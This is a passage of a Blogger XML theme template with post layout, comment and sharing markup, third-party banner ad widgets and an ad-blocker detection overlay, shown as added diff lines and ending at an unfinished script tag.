+<article class='post hentry' itemprop='blogPost' itemscope='itemscope' itemtype='https://schema.org/BlogPosting'>
+<div itemprop='image' itemscope='itemscope' itemtype='https://schema.org/ImageObject' style='display:none'>
+<meta itemprop='url' itemscope='itemscope'/>
+<img alt='' src='https://1.bp.blogspot.com/-GV8T6IywmYc/W_QAOa6E8aI/AAAAAAAAIWw/auwJjmbyU4cnkEkZj90fSBXAGuiHvgJswCLcBGAs/s512/Logo.png' style='display:none'/>
+<meta content='https://1.bp.blogspot.com/-GV8T6IywmYc/W_QAOa6E8aI/AAAAAAAAIWw/auwJjmbyU4cnkEkZj90fSBXAGuiHvgJswCLcBGAs/s512/Logo.png' itemprop='url'/>
+<meta content='500' itemprop='width'/>
+<meta content='300' itemprop='height'/>
+</div>
+<meta itemType='https://schema.org/WebPage' itemid='https://google.com/article' itemprop='mainEntityOfPage' itemscope='itemscope'/>
+<meta expr:content='data:post.snippet' property='og:description'/>
+<b:if cond='data:top.showTimestamp'>
+<meta expr:content='data:post.timestamp' itemprop='datePublished'/>
+<meta expr:content='data:post.timestampISO8601' itemprop='dateModified'/>
+</b:if>
+<div itemprop='publisher' itemscope='itemscope' itemtype='https://schema.org/Organization'>
+<div itemprop='logo' itemscope='itemscope' itemtype='https://schema.org/ImageObject'>
+<meta content='https://1.bp.blogspot.com/-GV8T6IywmYc/W_QAOa6E8aI/AAAAAAAAIWw/auwJjmbyU4cnkEkZj90fSBXAGuiHvgJswCLcBGAs/s512/Logo.png' itemprop='url'/>
+<meta content='512' itemprop='width'/>
+<meta content='32' itemprop='height'/>
+</div>
+<meta expr:content='data:blog.title' itemprop='name'/>
+</div>
+      <h2 class='post-title entry-title' itemprop='headline'>
+     <b:if cond='data:post.link'>
+       <a expr:href='data:post.link' expr:title='data:post.title'><data:post.title/></a>
+     <b:else/>
+        <b:if cond='data:post.url'>
+          <a expr:href='data:post.url' expr:title='data:post.title'><data:post.title/></a>
+        <b:else/>
+          <data:post.title/>
+        </b:if>
+     </b:if>
+      </h2>
+<div class='postmeta'>
+<span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person' style='display:none'>
+                      <meta expr:content='data:post.authorProfileUrl' itemprop='url'/>
+                      <a class='g-profile' expr:href='data:post.authorProfileUrl' rel='author' title='author profile'>
+                        <span itemprop='name'><data:post.author/></span>
+                      </a>
+                    </span>
+<a class='updated' expr:href='data:post.url' rel='bookmark' style='display:none' title='permanent link'><abbr class='published' expr:title='data:post.timestampISO8601' itemprop='datePublished dateModified'> <data:post.timestamp/></abbr></a>
+</div>
+
+    <div class='post-header'>
+    <div class='post-header-line-1'/>
+    </div>
+        <div class='clearfix'/>
+    <div class='post-body entry-content' expr:id='&quot;post-body-&quot; + data:post.id' expr:itemprop='(data:blog.metaDescription ? &quot;&quot; : &quot;description &quot;) + &quot;articleBody&quot;'>
+<div class='clearfix'/>	
+			<div id='ads-top-target'/> 
+  <data:post.body/>
+<div id='ads-bottom-target'/>
+      <div class='clearfix'/> <!-- clear for photos floats -->
+    </div>
+        <div class='clearfix'/>
+</article>
+</b:if>
+
+<b:if cond='data:view.isPost'>
+<article class='post hentry' itemprop='blogPost' itemscope='itemscope' itemtype='https://schema.org/BlogPosting'>
+<div itemprop='image' itemscope='itemscope' itemtype='https://schema.org/ImageObject' style='display:none'>
+<meta itemprop='url' itemscope='itemscope'/>
+<img alt='' expr:src='data:post.firstImageUrl' style='display:none'/>
+<meta expr:content='data:post.firstImageUrl' itemprop='url'/>
+<meta content='500' itemprop='width'/>
+<meta content='300' itemprop='height'/>
+</div>
+<meta itemType='https://schema.org/WebPage' itemid='https://google.com/article' itemprop='mainEntityOfPage' itemscope='itemscope'/>
+<meta expr:content='data:post.snippet' property='og:description'/>
+<b:if cond='data:top.showTimestamp'>
+<meta expr:content='data:post.timestamp' itemprop='datePublished'/>
+<meta expr:content='data:post.timestampISO8601' itemprop='dateModified'/>
+</b:if>
+<div itemprop='publisher' itemscope='itemscope' itemtype='https://schema.org/Organization'>
+<div itemprop='logo' itemscope='itemscope' itemtype='https://schema.org/ImageObject'>
+<meta content='https://1.bp.blogspot.com/-GV8T6IywmYc/W_QAOa6E8aI/AAAAAAAAIWw/auwJjmbyU4cnkEkZj90fSBXAGuiHvgJswCLcBGAs/s512/Logo.png' itemprop='url'/>
+<meta content='512' itemprop='width'/>
+<meta content='32' itemprop='height'/>
+</div>
+<meta expr:content='data:blog.title' itemprop='name'/>
+</div>
+<b:if cond='data:post.title'>
+   <b:if cond='data:blog.pageType != &quot;item&quot;'>
+      <b:if cond='data:blog.pageType != &quot;static_page&quot;'>
+         <h2 class='post-title entry-title' itemprop='headline'>
+            <b:if cond='data:post.link'>
+               <a expr:href='data:post.link' expr:title='data:post.title'>
+                 <data:post.title/>
+               </a>
+               <b:else/>
+               <b:if cond='data:post.url'>
+                  <b:if cond='data:blog.url != data:post.url'>
+                     <a expr:href='data:post.url' expr:title='data:post.title'>
+                        <data:post.title/>
+                     </a>
+                     <b:else/>
+                     <data:post.title/>
+                  </b:if>
+                  <b:else/>
+                  <data:post.title/>
+               </b:if>
+            </b:if>
+         </h2>
+         <b:else/>
+         <h1 class='post-title entry-title' itemprop='headline'>
+            <b:if cond='data:post.link'>
+               <a expr:href='data:post.link' expr:title='data:post.title'>
+                  <data:post.title/>
+               </a>
+               <b:else/>
+               <b:if cond='data:post.url'>
+                  <b:if cond='data:blog.url != data:post.url'>
+                     <a expr:href='data:post.url' expr:title='data:post.title'>
+                        <data:post.title/>
+                     </a>
+                     <b:else/>
+                     <data:post.title/>
+                  </b:if>
+                  <b:else/>
+                  <data:post.title/>
+               </b:if>
+            </b:if>
+         </h1>
+      </b:if>
+      <b:else/>
+      <h1 class='post-title entry-title' itemprop='headline'>
+         <b:if cond='data:post.link'>
+            <a expr:href='data:post.link' expr:title='data:post.title'>
+               <data:post.title/>
+            </a>
+            <b:else/>
+            <b:if cond='data:post.url'>
+               <b:if cond='data:blog.url != data:post.url'>
+                  <a expr:href='data:post.url' expr:title='data:post.title'>
+                     <data:post.title/>
+                  </a>
+                  <b:else/>
+                  <data:post.title/>
+               </b:if>
+               <b:else/>
+               <data:post.title/>
+            </b:if>
+         </b:if>
+      </h1>
+   </b:if>
+</b:if>
+
+    <div class='post-header'>
+    <div class='post-header-line-1'/>
+    </div>
+        <div class='clearfix'/>
+    <div class='post-body entry-content' expr:id='&quot;post-body-&quot; + data:post.id' expr:itemprop='(data:blog.metaDescription ? &quot;&quot; : &quot;description &quot;) + &quot;articleBody&quot;'>
+<div class='clearfix'/>
+<b:if cond='data:view.isPost'>
+<div itemprop='description'>
+<p>
+<div expr:id='&quot;post1&quot; + data:post.id'/>
+<div class='clearfix'/>
+<div id='ads-top-target'/> 
+<!-- iklan end -->
+<div class='clearfix'/>
+<div id='const' style='clear:both'/>
+<div id='output'/>
+<div class='clearfix'/>
+<!--iklan start -->
+<div id='ads-bottom-target'/>
+<!-- iklan end -->
+<div class='clearfix'/>
+<div expr:id='&quot;post2&quot; + data:post.id'><data:post.body/></div>
+<script type='text/javascript'>
+var obj0=document.getElementById(&quot;post1<data:post.id/>&quot;);
+var obj1=document.getElementById(&quot;post2<data:post.id/>&quot;);
+var s=obj1.innerHTML;
+var t=s.substr(0,s.length/2);
+var r=t.lastIndexOf(&quot;&lt;br&gt;&quot;);
+if(r&gt;0) {obj0.innerHTML=s.substr(0,r);obj1.innerHTML=s.substr(r+4);}
+</script>
+</p>
+</div>
+</b:if>
+      <div class='clearfix'/> <!-- clear for photos floats -->
+    </div>
+         <div class='clearfix'/>
+<div class='postmeta'>
+<span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person' style='display:none'>
+                      <meta expr:content='data:post.authorProfileUrl' itemprop='url'/>
+                      <a class='g-profile' expr:href='data:post.authorProfileUrl' rel='author' title='author profile'>
+                        <span itemprop='name'><data:post.author/></span>
+                      </a>
+                    </span>
+<a class='updated' expr:href='data:post.url' rel='bookmark' style='display:none' title='permanent link'><abbr class='published' expr:title='data:post.timestampISO8601' itemprop='datePublished dateModified'> <data:post.timestamp/></abbr></a>
+</div>
+<div class='clearfix'/>
+</article>
+</b:if>
+
+</b:includable>
+                <b:includable id='postAuthor'>
+  <span class='byline post-author vcard'>
+    <span class='post-author-label'>
+      <data:byline.label/>
+    </span>
+    <span class='fn'>
+      <b:if cond='data:post.author.profileUrl'>
+        <meta expr:content='data:post.author.profileUrl'/>
+        <a class='g-profile' expr:href='data:post.author.profileUrl' rel='author' title='author profile'>
+          <span><data:post.author.name/></span>
+        </a>
+      <b:else/>
+        <span><data:post.author.name/></span>
+      </b:if>
+    </span>
+  </span>
+</b:includable>
+                <b:includable id='postBody' var='post'>
+  <!-- If metaDescription is empty, use the post body as the schema.org description too, for G+/FB snippeting. -->
+  <div class='post-body entry-content float-container' expr:id='&quot;post-body-&quot; + data:post.id'>
+    <data:post.body/>
+  </div>
+</b:includable>
+                <b:includable id='postBodySnippet' var='post'>
+  <b:include data='post' name='postBody'/>
+</b:includable>
+                <b:includable id='postCommentsAndAd' var='post'>
+  <article class='post-outer-container'>
+    <!-- Post title and body -->
+    <div class='post-outer'>
+      <b:include data='post' name='post'/>
+    </div>
+
+    <!-- Comments -->
+    <b:include cond='data:view.isSingleItem' data='post' name='commentPicker'/>
+
+    <!-- Show ad inside post container, after comments, if single item. -->
+    <b:include cond='data:view.isSingleItem and data:post.includeAd' data='post' name='inlineAd'/>
+  </article>
+
+  <!-- Show ad outside post container (between posts) for feed pages. -->
+  <b:include cond='data:view.isMultipleItems and data:post.includeAd' data='post' name='inlineAd'/>
+</b:includable>
+                <b:includable id='postCommentsLink'>
+  <b:if cond='data:view.isMultipleItems'>
+    <span class='byline post-comment-link container'>
+      <b:include cond='data:post.commentSource != 1' name='commentsLink'/>
+    </span>
+  </b:if>
+</b:includable>
+                <b:includable id='postFooter' var='post'>
+  <div class='post-footer'>
+    <b:include name='footerBylines'/>
+    <b:include data='post' name='postFooterAuthorProfile'/>
+  </div>
+</b:includable>
+                <b:includable id='postFooterAuthorProfile' var='post'>
+  <b:if cond='data:post.author.aboutMe and data:view.isPost'>
+    <div class='author-profile'>
+      <b:if cond='data:post.author.authorPhoto.url'>
+        <img class='author-image' expr:src='data:post.author.authorPhoto.url' width='50px'/>
+        <div class='author-about'>
+          <b:include data='post' name='aboutPostAuthor'/>
+        </div>
+      <b:else/>
+        <b:include data='post' name='aboutPostAuthor'/>
+      </b:if>
+    </div>
+  </b:if>
+</b:includable>
+                <b:includable id='postHeader' var='post'>
+  <b:include name='headerByline'/>
+</b:includable>
+                <b:includable id='postJumpLink' var='post'>
+  <div class='jump-link flat-button'>
+    <a expr:href='data:post.url fragment &quot;more&quot;' expr:title='data:post.title'>
+      <b:eval expr='data:blog.jumpLinkMessage'/>
+    </a>
+  </div>
+</b:includable>
+                <b:includable id='postLabels'>
+  <span class='byline post-labels'>
+    <span class='byline-label'><data:byline.label/></span>
+    <b:loop index='i' values='data:post.labels' var='label'>
+      <a expr:href='data:label.url' rel='tag'>
+        <data:label.name/>
+      </a>
+    </b:loop>
+  </span>
+</b:includable>
+                <b:includable id='postLocation'>
+  <span class='byline post-location'>
+    <data:byline.label/>
+    <a expr:href='data:post.location.mapsUrl' target='_blank'><data:post.location.name/></a>
+  </span>
+</b:includable>
+                <b:includable id='postMeta' var='post'>
+  <b:include data='post' name='postMetadataJSON'/>
+</b:includable>
+                <b:includable id='postMetadataJSONImage'>
+  &quot;image&quot;: {
+    &quot;@type&quot;: &quot;ImageObject&quot;,
+    <b:if cond='data:post.featuredImage.isResizable'>
+    &quot;url&quot;: &quot;<b:eval expr='resizeImage(data:post.featuredImage, 1200, &quot;1200:630&quot;)'/>&quot;,
+    &quot;height&quot;: 630,
+    &quot;width&quot;: 1200
+    <b:else/>
+    &quot;url&quot;: &quot;https://lh3.googleusercontent.com/ULB6iBuCeTVvSjjjU1A-O8e9ZpVba6uvyhtiWRti_rBAs9yMYOFBujxriJRZ-A=w1200&quot;,
+    &quot;height&quot;: 348,
+    &quot;width&quot;: 1200
+    </b:if>
+  },
+</b:includable>
+                <b:includable id='postMetadataJSONPublisher'>
+ &quot;publisher&quot;: {
+    &quot;@type&quot;: &quot;Organization&quot;,
+    &quot;name&quot;: &quot;Blogger&quot;,
+    &quot;logo&quot;: {
+      &quot;@type&quot;: &quot;ImageObject&quot;,
+      &quot;url&quot;: &quot;https://lh3.googleusercontent.com/ULB6iBuCeTVvSjjjU1A-O8e9ZpVba6uvyhtiWRti_rBAs9yMYOFBujxriJRZ-A=h60&quot;,
+      &quot;width&quot;: 206,
+      &quot;height&quot;: 60
+    }
+  },
+</b:includable>
+                <b:includable id='postPagination'>
+  <div class='blog-pager container' id='blog-pager'>
+    <b:include cond='data:newerPageUrl' name='previousPageLink'/>
+    <b:include cond='data:olderPageUrl' name='nextPageLink'/>
+    <b:include cond='data:view.url != data:blog.homepageUrl' name='homePageLink'/>
+  </div>
+</b:includable>
+                <b:includable id='postQuickEdit' var='post'>
+  <b:if cond='data:post.editUrl'>
+    <span expr:class='&quot;item-control &quot; + data:post.adminClass'>
+      <a expr:href='&quot;//www.blogger.com//post-edit.g?blogID=&quot; + data:blog.blogId + &quot;&amp;amp;postID=&quot;+ data:post.id + &quot;&amp;amp;from=pencil&quot;' expr:title='data:top.editPostMsg'>
+        <i class='fa fa-pencil-square-o'/>
+      </a>
+    </span>
+  </b:if>
+</b:includable>
+                <b:includable id='postReactions'>
+  <!-- Reaction feature no longer available. The includable is retained for backwards-compatibility. -->
+</b:includable>
+                <b:includable id='postShareButtons'>
+  <div class='byline post-share-buttons goog-inline-block'>
+    <b:with value='data:sharingId ?: ((data:widget.instanceId ?: &quot;sharing&quot;) + &quot;-&quot; + (data:regionName ?: &quot;byline&quot;) + &quot;-&quot; + data:post.id)' var='sharingId'>
+      <!-- Note: 'sharingButtons' includable is from the default Sharing widget markup. -->
+      <b:include data='{                                                sharingId: data:sharingId,                                                originalUrl: data:post.url,                                                platforms: data:this.sharing.platforms,                                                shareUrl: data:post.shareUrl,                                                shareTitle: data:post.title,                                              }' name='sharingButtons'/>
+    </b:with>
+  </div>
+</b:includable>
+                <b:includable id='postTimestamp'>
+  <span class='byline post-timestamp'>
+    <data:byline.label/>
+    <b:if cond='data:post.url'>
+      <meta expr:content='data:post.url.canonical'/>
+      <a class='timestamp-link' expr:href='data:post.url' rel='bookmark' title='permanent link'>
+        <time class='published' expr:datetime='data:post.date.iso8601' expr:title='data:post.date.iso8601'>
+          <data:post.date/>
+        </time>
+      </a>
+    </b:if>
+  </span>
+</b:includable>
+                <b:includable id='postTitle' var='post'>
+  <a expr:name='data:post.id'/>
+  <b:if cond='data:post.title != &quot;&quot;'>
+    <h3 class='post-title entry-title'>
+      <b:if cond='data:post.link or (data:post.url and data:view.url != data:post.url)'>
+        <a expr:href='data:post.link ?: data:post.url'><data:post.title/></a>
+      <b:else/>
+        <data:post.title/>
+      </b:if>
+    </h3>
+  </b:if>
+</b:includable>
+                <b:includable id='previousPageLink'>
+  <a class='blog-pager-newer-link' expr:href='data:newerPageUrl' expr:id='data:widget.instanceId + &quot;_blog-pager-newer-link&quot;' expr:title='data:messages.newerPosts'>
+    <data:messages.newerPosts/>
+  </a>
+</b:includable>
+                <b:includable id='shareButtons' var='post'>
+<b:if cond='data:top.showEmailButton'><a class='goog-inline-block share-button sb-email' expr:href='&quot;//www.blogger.com/share-post.g?blogID=&quot; + data:blog.blogId + &quot;&amp;amp;postID=&quot;+ data:post.id + &quot;&amp;amp;target=email&quot;' expr:title='data:top.emailThisMsg' target='_blank'><span class='share-button-link-text'><data:top.emailThisMsg/></span></a></b:if><b:if cond='data:top.showBlogThisButton'><a class='goog-inline-block share-button sb-blog' expr:href='&quot;//www.blogger.com/share-post.g?blogID=&quot; + data:blog.blogId + &quot;&amp;amp;postID=&quot;+ data:post.id + &quot;&amp;amp;target=blog&quot;' expr:onclick='&quot;window.open(this.href, \&quot;_blank\&quot;, \&quot;height=270,width=475\&quot;); return false;&quot;' expr:title='data:top.blogThisMsg' target='_blank'><span class='share-button-link-text'><data:top.blogThisMsg/></span></a></b:if><b:if cond='data:top.showTwitterButton'><a class='goog-inline-block share-button sb-twitter' expr:href='&quot;//www.blogger.com/share-post.g?blogID=&quot; + data:blog.blogId + &quot;&amp;amp;postID=&quot;+ data:post.id + &quot;&amp;amp;target=twitter&quot;' expr:title='data:top.shareToTwitterMsg' target='_blank'><span class='share-button-link-text'><data:top.shareToTwitterMsg/></span></a></b:if><b:if cond='data:top.showFacebookButton'><a class='goog-inline-block share-button sb-facebook' expr:href='&quot;//www.blogger.com/share-post.g?blogID=&quot; + data:blog.blogId + &quot;&amp;amp;postID=&quot;+ data:post.id + &quot;&amp;amp;target=facebook&quot;' expr:onclick='&quot;window.open(this.href, \&quot;_blank\&quot;, \&quot;height=430,width=640\&quot;); return false;&quot;' expr:title='data:top.shareToFacebookMsg' target='_blank'><span class='share-button-link-text'><data:top.shareToFacebookMsg/></span></a></b:if><b:if cond='data:top.showOrkutButton'><a class='goog-inline-block share-button sb-orkut' expr:href='&quot;//www.blogger.com/share-post.g?blogID=&quot; + data:blog.blogId + &quot;&amp;amp;postID=&quot;+ data:post.id + &quot;&amp;amp;target=orkut&quot;' expr:title='data:top.shareToOrkutMsg' target='_blank'><span class='share-button-link-text'><data:top.shareToOrkutMsg/></span></a></b:if><b:if cond='data:top.showDummy'><div class='goog-inline-block dummy-container'><div class='g-plusone' data-size='medium'/></div></b:if>
+</b:includable>
+                <b:includable id='sharingButton'>
+  <span expr:aria-label='data:platform.shareMessage' expr:class='&quot;sharing-platform-button sharing-element-&quot; + data:platform.key' expr:data-href='data:shareUrl + &quot;&amp;target=&quot; + data:platform.target' expr:data-url='data:originalUrl' expr:title='data:platform.shareMessage' role='menuitem' tabindex='-1'>
+    <b:include name='sharingPlatformIcon'/>
+    <span class='platform-sharing-text'><data:platform.name/></span>
+  </span>
+</b:includable>
+                <b:includable id='sharingButtonContent'>
+  <div class='flat-icon-button ripple'>
+    <b:include name='shareIcon'/>
+  </div>
+</b:includable>
+                <b:includable id='sharingButtons'>
+  <div class='sharing' expr:aria-owns='&quot;sharing-popup-&quot; + data:sharingId' expr:data-title='data:shareTitle'>
+    <button class='sharing-button touch-icon-button' expr:aria-controls='&quot;sharing-popup-&quot; + data:sharingId' expr:aria-label='data:messages.share.escaped' expr:id='&quot;sharing-button-&quot; + data:sharingId' role='button'>
+      <b:include name='sharingButtonContent'/>
+    </button>
+    <b:include name='sharingButtonsMenu'/>
+  </div>
+</b:includable>
+                <b:includable id='sharingButtonsMenu'>
+  <div class='share-buttons-container'>
+    <ul aria-hidden='true' class='share-buttons hidden' expr:aria-label='data:messages.share.escaped' expr:id='&quot;sharing-popup-&quot; + data:sharingId' role='menu'>
+      <b:loop values='(data:platforms ?: data:blog.sharing.platforms) filter (p =&gt; p.key not in {&quot;blogThis&quot;})' var='platform'>
+        <li>
+          <b:include name='sharingButton'/>
+        </li>
+      </b:loop>
+      <li aria-hidden='true' class='hidden'>
+        <b:include name='otherSharingButton'/>
+      </li>
+    </ul>
+  </div>
+</b:includable>
+                <b:includable id='sharingPlatformIcon'>
+  <b:include data='{ iconClass: (&quot;touch-icon sharing-&quot; + data:platform.key) }' expr:name='data:platform.key + &quot;Icon&quot;'/>
+</b:includable>
+                <b:includable id='status-message'/>
+                <b:includable id='threaded-comment-form' var='post'/>
+                <b:includable id='threadedCommentForm' var='post'>
+  <div class='comment-form'>
+    <a name='comment-form'/>
+    <h4 id='comment-post-message'><data:messages.postAComment/></h4>
+    <b:if cond='data:this.messages.blogComment != &quot;&quot;'>
+      <p><data:this.messages.blogComment/></p>
+    </b:if>
+    <b:include data='post' name='commentFormIframeSrc'/>
+    <iframe allowtransparency='allowtransparency' class='blogger-iframe-colorize blogger-comment-from-post' expr:height='data:cmtIframeInitialHeight ?: &quot;90px&quot;' frameborder='0' id='comment-editor' name='comment-editor' src='' width='100%'/>
+    <data:post.cmtfpIframe/>
+    <script type='text/javascript'>
+      BLOG_CMT_createIframe(&#39;<data:post.appRpcRelayPath/>&#39;);
+    </script>
+  </div>
+</b:includable>
+                <b:includable id='threadedCommentJs' var='post'>
+  <script async='async' expr:src='data:post.commentSrc' type='text/javascript'/>
+  <b:template-script inline='true' name='threaded_comments'/>
+  <script type='text/javascript'>
+    blogger.widgets.blog.initThreadedComments(
+        <data:post.commentJso/>,
+        <data:post.commentMsgs/>,
+        <data:post.commentConfig/>);
+  </script>
+</b:includable>
+                <b:includable id='threadedComments' var='post'>
+  <section class='comments threaded' expr:data-embed='data:post.embedCommentForm' expr:data-num-comments='data:post.numberOfComments' id='comments'>
+    <a name='comments'/>
+
+    <b:include name='commentsTitle'/>
+
+    <div class='comments-content'>
+      <b:if cond='data:post.embedCommentForm'>
+        <b:include data='post' name='threadedCommentJs'/>
+      </b:if>
+      <div id='comment-holder'>
+         <data:post.commentHtml/>
+      </div>
+    </div>
+
+    <p class='comment-footer'>
+      <b:if cond='data:post.allowNewComments'>
+        <b:include data='post' name='threadedCommentForm'/>
+      <b:else/>
+        <data:post.noNewCommentsText/>
+      </b:if>
+      <b:if cond='data:post.showManageComments'>
+        <b:include data='post' name='manageComments'/>
+      </b:if>
+    </p>
+
+    <b:if cond='data:showCmtPopup'>
+      <div id='comment-popup'>
+        <iframe allowtransparency='allowtransparency' frameborder='0' id='comment-actions' name='comment-actions' scrolling='no'>
+        </iframe>
+      </div>
+    </b:if>
+  </section>
+</b:includable>
+                <b:includable id='threaded_comment_js' var='post'/>
+                <b:includable id='threaded_comments' var='post'/>
+                <b:includable id='tooltipCss'>
+  <!-- LINT.IfChange -->
+  <style>
+    .post-body a.b-tooltip-container {
+      position: relative;
+      display: inline-block;
+    }
+
+    .post-body a.b-tooltip-container .b-tooltip {
+      position: absolute;
+      top: 100%;
+      left: 50%;
+      transform: translate(-20%, 1px);
+      visibility: hidden;
+      opacity: 0;
+      z-index: 1;
+      transition: opacity 0.2s ease-in-out;
+    }
+
+    .post-body a.b-tooltip-container .b-tooltip iframe {
+      width: 200px;
+      height: 198px;
+      max-width: none;
+      border: none;
+      border-radius: 20px;
+      box-shadow: 1px 1px 3px 1px rgba(0, 0, 0, 0.2);
+    }
+
+    .post-body a.b-tooltip-container:hover .b-tooltip {
+      visibility: visible;
+      opacity: 1;
+    }
+  </style>
+  <!-- LINT.ThenChange(//depot/google3/java/com/google/blogger/b2/layouts/widgets/v2-style.css) -->
+</b:includable>
+              </b:widget>
+              <b:widget cond='data:view.isSingleItem and not data:view.isPreview' id='HTML111' locked='true' title='' type='HTML' version='2' visible='false'>
+                <b:widget-settings>
+                  <b:widget-setting name='content'><![CDATA[<script type="text/javascript" src="https://uprimp.com/bnr.php?section=General&pub=481715&format=300x50&ga=g&mbtodb=1"></script>
+<noscript><a href="https://yllix.com/publishers/481715" target="_blank"><img src="//ylx-aff.advertica-cdn.com/pub_zn9ugf.png" style="border:none;margin:0;padding:0;vertical-align:baseline;" alt="ylliX - Online Advertising Network" /></a></noscript>]]></b:widget-setting>
+                </b:widget-settings>
+                <b:includable id='main'>      
+<div id='ads-top-post-source'>                
+<div class='adspost'>
+<data:content/>
+</div>
+</div>        
+<script type='text/javascript'>
+kodein_MoveByID(&#39;ads-top-post-source&#39;,&#39;ads-top-target&#39;);
+</script>     
+</b:includable>
+              </b:widget>
+              <b:widget cond='data:view.isSingleItem and not data:view.isPreview' id='HTML255' locked='true' title='' type='HTML' version='2' visible='false'>
+                <b:widget-settings>
+                  <b:widget-setting name='content'><![CDATA[<script type="text/javascript" src="https://uprimp.com/bnr.php?section=General&pub=481715&format=468x60&ga=g"></script>
+<noscript><a href="https://yllix.com/publishers/481715" target="_blank"><img src="//ylx-aff.advertica-cdn.com/pub/468x60.png" style="border:none;margin:0;padding:0;vertical-align:baseline;" alt="ylliX - Online Advertising Network" /></a></noscript>]]></b:widget-setting>
+                </b:widget-settings>
+                <b:includable id='main'>      
+<div id='ads-center-post'>               
+<div class='adspost'>
+<data:content/>
+</div>
+</div>        
+<script type='text/javascript'>
+kodein_MoveByID(&#39;ads-center-post&#39;,&#39;ads-center-target&#39;);
+</script>     
+</b:includable>
+              </b:widget>
+              <b:widget cond='data:view.isSingleItem and not data:view.isPreview' id='HTML222' locked='true' title='' type='HTML' version='2' visible='false'>
+                <b:widget-settings>
+                  <b:widget-setting name='content'><![CDATA[<script type="text/javascript" src="https://uprimp.com/bnr.php?section=General&pub=481715&format=468x60&ga=g"></script>
+<noscript><a href="https://yllix.com/publishers/481715" target="_blank"><img src="//ylx-aff.advertica-cdn.com/pub/468x60.png" style="border:none;margin:0;padding:0;vertical-align:baseline;" alt="ylliX - Online Advertising Network" /></a></noscript>]]></b:widget-setting>
+                </b:widget-settings>
+                <b:includable id='main'>      
+<div id='ads-bottom-post-source'>               
+<div class='adspost bottom'>
+<data:content/>
+</div>
+</div>        
+<script type='text/javascript'>
+kodein_MoveByID(&#39;ads-bottom-post-source&#39;,&#39;ads-bottom-target&#39;);
+</script>     
+</b:includable>
+              </b:widget>
+            </b:section>
+
+            <b:section cond='false' id='reset'>
+              <b:widget id='HTML1' locked='false' title='' type='HTML' visible='true'>
+                <b:widget-settings>
+                  <b:widget-setting name='content'>3323</b:widget-setting>
+                </b:widget-settings>
+                <b:includable id='main'>
+  <b:include name='widget-title'/>
+  <div class='widget-content'>
+    <data:content/>
+  </div>
+</b:includable>
+              </b:widget>
+            </b:section>
+
+          </div>
+
+<b:if cond='data:blog.isMobileRequest == &quot;false&quot;'>
+
+
+          <div class='col-12 col-md-3 order-last mb-3'>
+             <b:section class='ads-right sticky-top' cond='!data:view.isPreview' id='ads-right' maxwidgets='1'>
+               <b:widget id='HTML4' locked='false' title='' type='HTML' visible='false'>
+                 <b:widget-settings>
+                   <b:widget-setting name='content'><![CDATA[<script type="text/javascript" src="https://uprimp.com/bnr.php?section=General&pub=481715&format=300x50&ga=g&mbtodb=1"></script>
+<noscript><a href="https://yllix.com/publishers/481715" target="_blank"><img src="//ylx-aff.advertica-cdn.com/pub_zn9ugf.png" style="border:none;margin:0;padding:0;vertical-align:baseline;" alt="ylliX - Online Advertising Network" /></a></noscript>]]></b:widget-setting>
+                 </b:widget-settings>
+                 <b:includable id='main'>
+  <b:include name='widget-title'/>
+  <div class='widget-content'>
+    <data:content/>
+  </div>
+</b:includable>
+               </b:widget>
+             </b:section>
+          </div>
+</b:if>
+        </div>
+
+      </div>
+    </div>
+  </div>
+</div>
+
+<footer class='footer'>
+  <div class='d-table w-100' style='height:100%'>
+    <div class='d-table-row'>
+      <div class='d-table-cell align-middle'>
+        <div class='container'>
+          <div class='row'>
+            <div class='col-sm-5'>
+              &#169;  All rights reserved <a expr:href='data:blog.homepageUrl' expr:title='data:blog.title'><span expr:title='data:blog.title'><data:blog.title/></span></a><a class='impo' id=''/>
+
+            </div>
+            <div class='col-sm-7 text-left'>
+<a href='https://niadzgn.blogspot.com/' id='niadzgn-project' style='font-size: 11px;margin-middle: 61px;color: #fff;background: #5c80f6;padding: 6px 10px;border-radius: 6px;text-decoration: none;'>NIADZGN.blogspot.com</a>
+              <!-- Please Dont Remove Or Change My Link  -->
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</footer>
+<link href='https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css' rel='stylesheet'/>
+<div id='WgD'>
+  <div class='WgD-position'>
+    <div class='WgD-container'>
+       <h3 class='WgD-title'>Ad blocker detected</h3>
+      <p class='WgD-text'> Our site is kept running thanks to ads so <strong> Please turn off your ad blocker or use another browser. </strong> Thank you for your understanding </p>
+      <a class='WgD-reload' href='.'>Disabled</a>
+    </div>
+  </div>
+  <div class='WgD-particles'>
+    <i class='wgd-usd'/><i class='wgd-eur'/>
+    <i class='wgd-usd'/><i class='wgd-eur'/>
+    <i class='wgd-btc'/><i class='wgd-usd'/>
+    <i class='wgd-usd'/><i class='wgd-eur'/>
+    <i class='wgd-btc'/><i class='wgd-usd'/>
+    <i class='wgd-eur'/>
+  </div>
+</div>
+<script>//<![CDATA[
+function adBlockClose(){document.getElementById("WgD").classList.remove("is-detected"),document.body.classList.remove("ab-is-detected")}function adBlockDetected(){document.getElementById("WgD").classList.add("is-detected"),document.body.classList.add("ab-is-detected")}if("undefined"!=typeof fuckAdBlock||"undefined"!=typeof FuckAdBlock)adBlockDetected();else{var importFAB=document.createElement("script");importFAB.onload=function(){fuckAdBlock.onDetected(adBlockDetected),fuckAdBlock.onNotDetected(adBlockNotDetected)},importFAB.onerror=function(){adBlockDetected()},importFAB.integrity="sha256-xjwKUY/NgkPjZZBOtOxRYtK20GaqTwUCf7WYCJ1z69w=",importFAB.crossOrigin="anonymous",importFAB.src="https://cdnjs.cloudflare.com/ajax/libs/fuckadblock/3.2.1/fuckadblock.min.js",document.head.appendChild(importFAB)}
+//]]></script>
+
+<script>
+/*<![CDATA[*/
